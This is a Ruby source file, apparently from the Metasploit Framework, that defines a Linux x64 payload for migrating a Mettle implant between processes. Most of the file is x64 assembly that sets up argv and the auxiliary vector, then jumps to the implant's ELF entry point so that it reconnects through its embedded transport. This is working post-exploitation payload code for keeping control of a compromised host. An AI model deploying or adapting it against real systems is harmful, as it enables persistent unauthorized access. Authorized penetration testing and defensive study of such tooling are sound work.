# -*- coding: binary -*-
# frozen_string_literal: true

require 'rex/elfparsey'

module Msf
  # Payload that supports reconnecting migrations on x64.
  module Payload::Linux::X64::MigrateHttp
    include Msf::Payload::Linux::X64::Migrate

    #
    # Starts a Mettle process image which reconnects using its embedded transport.
    #
    def generate_migrate(opts = {})
      entry_offset = elf_entry_point(opts.fetch(:payload))

      %(
      pop r14                    ; child-readiness word
      pop rax                    ; discard source pid
      pop rax                    ; discard source transport fd
      pop rsi                    ; process image address

      and rsp, -16
      add rsp, 128
      sub rsp, 8                ; account for the third argv entry
      mov eax, 0x6d              ; argv[0] = "m"
      push rax
      mov rcx, rsp

      xor ebx, ebx
      push rbx                   ; AT_NULL value
      push rbx                   ; AT_NULL type
      push rsi                   ; AT_BASE value
      push 7                     ; AT_BASE type
      push rbx                   ; envp terminator
      push rbx                   ; argv terminator
      push r14                   ; argv[2] = child-readiness word
      push -1                    ; argv[1] = no inherited transport fd
      push rcx                   ; argv[0]
      push 3                     ; argc

      add rsi, #{entry_offset}
      jmp rsi
    )
    end

    private

    def elf_entry_point(payload)
      Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload)).elf_header.e_entry
    end
  end
end
